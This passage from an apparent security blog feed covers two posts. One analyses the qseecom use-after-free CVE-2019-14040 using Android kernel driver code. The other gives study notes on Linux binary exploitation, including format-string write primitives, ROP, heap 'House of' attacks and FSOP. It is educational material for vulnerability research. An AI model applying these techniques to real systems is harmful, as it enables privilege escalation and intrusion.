class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qseecom_unmap_ion_allocated_memory</span><span class="params">(struct qseecom_dev_handle*data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span>(!IS_ERR_OR_NULL(data-&gt;client.ihandle)) &#123;</span><br><span class="line">      ion_unmap_kernel(qseecom.ion_clnt,data-&gt;client.ihandle);<span class="comment">//解除用户态 ion内存到内核态的映射</span></span><br><span class="line">       ion_free(qseecom.ion_clnt,data-&gt;client.ihandle);</span><br><span class="line">       data-&gt;client.ihandle= <span class="literal">NULL</span>; <span class="comment">//只是把这个指针置空了</span></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里它只处理了ihandle，free并置空；并没有看到把其它成员置空（说实话free我也没看到，对着源码一通找，作者说没有就是没有），所以会造成后续再use。</p><h3 id="Use-过程"><a href="#Use-过程" class="headerlink" title="Use 过程"></a>Use 过程</h3><p>重新分配相同大小的堆块，还挺容易命中的，遗憾的是我们再open，但初始化的时候也没有清残留数据。我们身为用户态要想办法手动use到这些没有释放的东西。</p><p>我们的目标是能够使用这些free掉的结构中残留的数据，如何能够保证残留数据可用，第一，残留的关键数据不被接下来的流程所覆盖，第二，保护流程正常走下去，现有的qseecom_dev_handle结构不被无效的操作释放。为了保证满足第二条，我们需要满足qseecom_dev_handle成员client的ihandle指针不能为空（__validate_send_service_cmd_inputs会检查），因为之前释放的时候这里被置空了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __validate_send_service_cmd_inputs(struct qseecom_dev_handle *data,</span><br><span class="line">                struct qseecom_send_svc_cmd_req *req)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!req || !req-&gt;resp_buf || !req-&gt;cmd_req_buf) &#123;</span><br><span class="line">        pr_err(<span class="string">"req or cmd buffer or response buffer is null\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!data || !data-&gt;client.ihandle) &#123;</span><br><span class="line">        pr_err(<span class="string">"Client or client handle is not initialized\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>为了达到这个残留数据不被覆盖的目标，只需要用户态发送一个QSEECOM_IOCTL_SET_MEM_PARAM_REQ ioctl请求，且用户提交的ION内存分配的长度信息大于实际用户所分配的大小即可，例如用户只分配了0x1000字节内存，但是用户提交给内核说我分配了0x2000个字节，这时内核检测出来会返回错误，但是看qseecom_set_client_mem_param函数处理流程，qseecom_dev_handle指针没有被销毁，那个残留数据也没有被覆盖，所以结构体里面的ihandle也赋值了不为空，两个条件都满足了，然后接下来的正常业务处理逻辑将会把之前残留的sb_virt/sb_phys地址用于内存读写操作，完成真正的use操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_send_modfd_cmd(struct qseecom_dev_handle *data,</span><br><span class="line">                    <span class="keyword">void</span> __user *argp,</span><br><span class="line">                    <span class="keyword">bool</span> is_64bit_addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qseecom_send_modfd_cmd_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qseecom_send_cmd_req</span> <span class="title">send_cmd_req</span>;</span></span><br><span class="line">    ret = copy_from_user(&amp;req, argp, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        pr_err(<span class="string">"copy_from_user failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    send_cmd_req.cmd_req_buf = req.cmd_req_buf;</span><br><span class="line">    send_cmd_req.cmd_req_len = req.cmd_req_len;</span><br><span class="line">    send_cmd_req.resp_buf = req.resp_buf;</span><br><span class="line">    send_cmd_req.resp_len = req.resp_len;</span><br><span class="line">    <span class="keyword">if</span> (__validate_send_cmd_inputs(data, &amp;send_cmd_req))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/* validate offsets */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ION_FD; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.ifd_data[i].cmd_buf_offset &gt;= req.cmd_req_len) &#123;</span><br><span class="line">            pr_err(<span class="string">"Invalid offset %d = 0x%x\n"</span>,</span><br><span class="line">                i, req.ifd_data[i].cmd_buf_offset);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    req.cmd_req_buf = (<span class="keyword">void</span> *)__qseecom_uvirt_to_kvirt(data,</span><br><span class="line">                        (<span class="keyword">uintptr_t</span>)req.cmd_req_buf);</span><br><span class="line">    req.resp_buf = (<span class="keyword">void</span> *)__qseecom_uvirt_to_kvirt(data,</span><br><span class="line">                        (<span class="keyword">uintptr_t</span>)req.resp_buf);</span><br><span class="line">    <span class="keyword">if</span> (!is_64bit_addr) &#123;</span><br><span class="line">        ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">false</span>, data);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        ret = __qseecom_send_cmd(data, &amp;send_cmd_req);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">true</span>, data);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = __qseecom_update_cmd_buf_64(&amp;req, <span class="literal">false</span>, data);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        ret = __qseecom_send_cmd(data, &amp;send_cmd_req);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        ret = __qseecom_update_cmd_buf_64(&amp;req, <span class="literal">true</span>, data);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>放一个<a href="https://github.com/tamirzb/CVE-2019-14040">poc</a>，还没分析过。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种UAF其实是，用户态和内核态不同步造成的，内核态给用户态报错了，但是我用户就要继续用，就造成了问题。这个分析偏原理，因为没有找到比较好的POC。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;致谢参考&quot;&gt;&lt;a href=&quot;#致谢参考&quot; class=&quot;headerlink&quot; title=&quot;致谢参考&quot;&gt;&lt;/a&gt;致谢参考&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.zimperium.com/multiple-kernel-vuln
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Linux pwn 相关知识整理</title>
    <link href="https://github.com/Cracke-S-J/2020/04/15/LinuxPWN%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/Cracke-S-J/2020/04/15/LinuxPWN%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</id>
    <published>2020-04-15T12:16:59.000Z</published>
    <updated>2020-05-23T14:15:37.233Z</updated>
    
    <content type="html"><![CDATA[<p>不整理就等于不能娴熟地表达出来就等于不会。</p><p>致谢参考：</p><ol><li><a href="https://ctf-wiki.github.io/" target="_blank" rel="noopener">https://ctf-wiki.github.io/</a></li><li><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></li></ol><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><p>先说个缓解措施，就是各种保护，大佬嘴里叫“缓解措施”，也就是并不能解决，只能缓解。</p><p><code>checksec</code>里的：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO是Read Only Relocation，大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Canary是插在栈中保护栈的，防止篡改栈上内容，可以泄露然后回填。</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX是No-eXecute，就是将数据页标为不可执行。</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>一般情况下PIE（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br>ASLR（Address Space Layout Randomization）有以下三种情况。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加堆（heap）的随机化。</span><br></pre></td></tr></table></figure><p>PIE，位置独立的可执行区域（position-independent executables）。就是生成位置无关代码。</p><h3 id="内核相关"><a href="#内核相关" class="headerlink" title="内核相关"></a>内核相关</h3><ol><li>smep: Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)</li><li>smap: Superivisor Mode Access Protection，类似于 smep，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</li><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li><li>KASLR：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li><li>Canary, DEP, PIE, RELRO 等保护与用户态原理和作用相同。</li><li>/proc/kallsyms函数中将存放了大量关键的函数的真实地址，这是十分危险的，低版本内核也提供了一些保护措施如kptr_restrict保护，但是在4.15.*以上内核中，内核新增了一个保护机制。</li></ol><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>ROP 利用 gadgets 布置栈和寄存器控制流程。</p><p>x64 下可利用 __libc_csu_init 中的 gadgets。</p><h3 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h3><ol><li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li><li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li><li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li></ol><h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><p>盲打</p><ul><li>判断栈溢出长度<ul><li>暴力枚举</li></ul></li><li>Stack Reading<ul><li>获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。</li></ul></li><li>Blind ROP<ul><li>找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。</li></ul></li><li>Build the exploit<ul><li>利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。</li></ul></li></ul><h3 id="转移栈-转移堆"><a href="#转移栈-转移堆" class="headerlink" title="转移栈/转移堆"></a>转移栈/转移堆</h3><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本任意写就是这样<code>[addr of c]%012d%6$n</code>；任意读也差不多<code>addr%k$s</code>。</p><p>见过去写scanf的，为了突破输入长度。</p><h2 id="堆相关"><a href="#堆相关" class="headerlink" title="堆相关"></a>堆相关</h2><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><h4 id="溢出任意字节"><a href="#溢出任意字节" class="headerlink" title="溢出任意字节"></a>溢出任意字节</h4><ol><li>覆盖与其物理相邻的下一个 chunk 的内容。<ul><li>prev_size</li><li>size，主要有三个比特位，以及该堆块真正的大小。<ul><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the True chunk size</li></ul></li><li>chunk content，从而改变程序固有的执行流。</li></ul></li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ol><h4 id="溢出null字节"><a href="#溢出null字节" class="headerlink" title="溢出null字节"></a>溢出null字节</h4><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。<ol><li>这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</li><li>另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li></ol></li></ol><h3 id="UAF-DBF"><a href="#UAF-DBF" class="headerlink" title="UAF/DBF"></a>UAF/DBF</h3><p>Fastbin 改 fd，Unsortedbin 用 unlink。</p><h3 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h3><p>迁移堆上栈、上bss。</p><h3 id="其它系列攻击"><a href="#其它系列攻击" class="headerlink" title="其它系列攻击"></a>其它系列攻击</h3><h4 id="Unsortedbin修改任意位置地址"><a href="#Unsortedbin修改任意位置地址" class="headerlink" title="Unsortedbin修改任意位置地址"></a>Unsortedbin修改任意位置地址</h4><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul><h4 id="TopChunk-攻击"><a href="#TopChunk-攻击" class="headerlink" title="TopChunk 攻击"></a>TopChunk 攻击</h4><p>可以修改size or free。</p><h3 id="House-of-系列"><a href="#House-of-系列" class="headerlink" title="House of 系列"></a>House of 系列</h3><h4 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h4><p>House of Spirit 技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><h4 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h4><p>两个物理相邻的 chunk 会共享 prev_size字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 prev_size 字段。</p><p>一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。</p><p>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize)) 。</p><p>那么如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p><h4 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h4><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p><h4 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h4><p>修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p><h4 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h4><p>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><h4 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h4><p>在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备。</p><h4 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h4><p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p><h2 id="IO-FILE相关"><a href="#IO-FILE相关" class="headerlink" title="IO_FILE相关"></a>IO_FILE相关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h3><p>就是单单纯纯地伪造虚表劫持程序流程。</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。</p><p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="libc2-23有检测"><a href="#libc2-23有检测" class="headerlink" title="libc2.23有检测"></a>libc2.23有检测</h3><p>TODO</p><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><h3 id="TOCTOU-Time-of-check-Time-of-use"><a href="#TOCTOU-Time-of-check-Time-of-use" class="headerlink" title="TOCTOU (Time-of-check Time-of-use)"></a>TOCTOU (Time-of-check Time-of-use)</h3><h3 id="Signal-Handler-Race-Condition"><a href="#Signal-Handler-Race-Condition" class="headerlink" title="Signal Handler Race Condition"></a>Signal Handler Race Condition</h3><p>线程安全造成的 double free。</p><p>找到竞争窗口（race windows），使用同步原语消除竞争条件：</p><ul><li>锁变量<ul><li>通常互斥琐，在等待期间放弃 CPU，进入 idle 状态，过一段时间自动尝试。</li><li>自旋锁（spinlock），在等待期间不放弃 CPU，一直尝试。</li></ul></li><li>条件变量<ul><li>条件变量是用来等待而不是用来上锁的。条件变量用来自动阻塞一个线程，直到某特殊情况发生为止。通常条件变量和互斥锁同时使用。</li></ul></li><li>临界区对象，CRITICAL_SECTION</li><li>信号量（semaphore），控制可访问某个临界区的线程数量，一般比 1 大。</li><li>管道，指用于连接一个读进程和一个写进程以实现它们之间通信的一个共享文件。其生存期不超过创建管道的进程的生存期。</li><li>命名管道，生存期可以与操作系统运行期一样长。</li></ul><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>就，溢出。</p><h2 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h2><p>一些jio本语言都有对应的一些逃逸方法。</p><h2 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h2><p>在Java和JS中比较常见。</p><p>简而言之就是把指针解析成字符串会泄露地址，把字符串解析成指针可以任意执行。</p><h2 id="kernel-pwn"><a href="#kernel-pwn" class="headerlink" title="kernel pwn"></a>kernel pwn</h2><p>见<a href="https://cracke-s-j.github.io/2020/04/06/Linuxkernelpwn%E5%9F%BA%E7%A1%80%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">Linux kernel pwn 基础整理</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不整理就等于不能娴熟地表达出来就等于不会。&lt;/p&gt;
&lt;p&gt;致谢参考：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://ctf-wiki.github.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf-wiki.git
      
    
    </summary>
    
    
